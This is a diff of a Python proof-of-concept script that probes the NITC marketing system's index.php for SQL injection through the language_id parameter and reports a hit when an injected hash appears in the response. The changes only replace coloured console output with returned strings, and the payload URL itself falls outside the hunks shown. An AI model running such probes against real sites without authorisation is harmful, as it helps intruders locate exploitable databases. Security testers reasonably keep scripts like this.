@@ -8,8 +8,8 @@ description: 文件/index.php中,参数language_id存在SQL注入。
 '''
 import sys
 import requests
-import warnings
-from termcolor import cprint
+
+
 
 class nitc_index_language_id_sqli_BaseVerify:
     def __init__(self, url):
@@ -24,12 +24,12 @@ class nitc_index_language_id_sqli_BaseVerify:
         try:
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if r"81dc9bdb52d04dc20036dbd8313ed05" in req.text:
-                cprint("[+]存在NITC营销系统index.php SQL注入漏洞...(高危)\tpayload: "+vulnurl, "red")
+                return "[+]存在NITC营销系统index.php SQL注入漏洞...(高危)\tpayload: "+vulnurl
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            return "[-]connect timeout"
 
 if __name__ == "__main__":
-    warnings.filterwarnings("ignore")
+
     testVuln = nitc_index_language_id_sqli_BaseVerify(sys.argv[1])
     testVuln.run()
